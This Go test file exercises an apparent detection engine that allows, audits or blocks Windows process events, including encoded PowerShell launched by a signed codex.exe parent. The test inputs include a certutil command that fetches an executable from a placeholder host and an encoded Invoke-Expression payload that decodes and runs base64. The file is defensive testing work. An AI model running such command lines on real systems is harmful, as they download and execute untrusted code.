// STATUS: DIAMANT VGT SUPREME
package mhx

import (
	"encoding/base64"
	"testing"
	"unicode/utf16"
)

func encodedUTF16LE(value string) string {
	units := utf16.Encode([]rune(value))
	raw := make([]byte, len(units)*2)
	for index, unit := range units {
		raw[index*2] = byte(unit)
		raw[index*2+1] = byte(unit >> 8)
	}
	return base64.StdEncoding.EncodeToString(raw)
}

func TestKnownSignedCodexParserIsInformational(t *testing.T) {
	payload := `[System.Management.Automation.Language.Parser]::ParseInput($args[0],[ref]$tokens,[ref]$errors)`
	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand " + encodedUTF16LE(payload), ParentImage: "codex.exe", ParentSigState: "Valid", ParentSigner: `CN="OpenAI OpCo, LLC"`}
	result := (Evaluator{}).Analyze(event)
	if result.EffectiveSeverity != SeverityInformational || result.Disposition != DispositionAllow || result.ConfidenceBasis != 9990 {
		t.Fatalf("unexpected classification: %+v", result)
	}
}

func TestCodexNameWithoutSignatureDoesNotBypass(t *testing.T) {
	payload := `[System.Management.Automation.Language.Parser]::ParseInput($args[0],[ref]$tokens,[ref]$errors)`
	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -enc " + encodedUTF16LE(payload), ParentImage: "codex.exe", ParentSigState: "NotSigned"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.EffectiveSeverity != SeverityHigh {
		t.Fatalf("unsigned parent bypassed policy: %+v", result)
	}
}

func TestMaliciousPayloadOverridesTrustedParent(t *testing.T) {
	payload := `Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))`
	event := ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -enc " + encodedUTF16LE(payload), ParentImage: "codex.exe", ParentSigState: "Valid", ParentSigner: "CN=OpenAI OpCo, LLC"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.Classification != "SUSPICIOUS" {
		t.Fatalf("malicious content was not blocked: %+v", result)
	}
}

func TestMalformedBase64FailsClosed(t *testing.T) {
	result := (Evaluator{}).Analyze(ProcessEvent{Image: "powershell.exe", CommandLine: "powershell.exe -EncodedCommand !!!"})
	if result.Disposition != DispositionBlock || result.Classification != "MALFORMED ENCODED COMMAND" {
		t.Fatalf("malformed payload failed open: %+v", result)
	}
}

func TestCertutilHashOperationRemainsAuditOnly(t *testing.T) {
	event := ProcessEvent{Image: "certutil.exe", ImagePath: `C:\Windows\System32\certutil.exe`, CommandLine: `certutil.exe -hashfile C:\safe.bin SHA256`, SignerStatus: "Valid"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionAudit {
		t.Fatalf("benign hash operation was blocked: %+v", result)
	}
}

func TestCertutilRemoteFetchIsBlocked(t *testing.T) {
	event := ProcessEvent{Image: "certutil.exe", ImagePath: `C:\Windows\System32\certutil.exe`, CommandLine: `certutil.exe -urlcache -split -f https://example.invalid/a.exe`, SignerStatus: "Valid"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock || result.EffectiveSeverity != SeverityHigh {
		t.Fatalf("remote-fetch behavior escaped: %+v", result)
	}
}

func TestOfficeToPowerShellLineageIsBlocked(t *testing.T) {
	event := ProcessEvent{Image: "powershell.exe", ImagePath: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, CommandLine: `powershell.exe -NoProfile -Command Get-Date`, SignerStatus: "Valid", Ancestry: []ProcessIdentity{{Image: "WINWORD.EXE"}}}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock {
		t.Fatalf("risky lineage escaped: %+v", result)
	}
}

func TestMasqueradedPowerShellIsBlocked(t *testing.T) {
	event := ProcessEvent{Image: "powershell.exe", ImagePath: `C:\Users\User\AppData\Local\Temp\powershell.exe`, CommandLine: `powershell.exe`, SignerStatus: "NotSigned"}
	result := (Evaluator{}).Analyze(event)
	if result.Disposition != DispositionBlock {
		t.Fatalf("masqueraded shell escaped: %+v", result)
	}
}
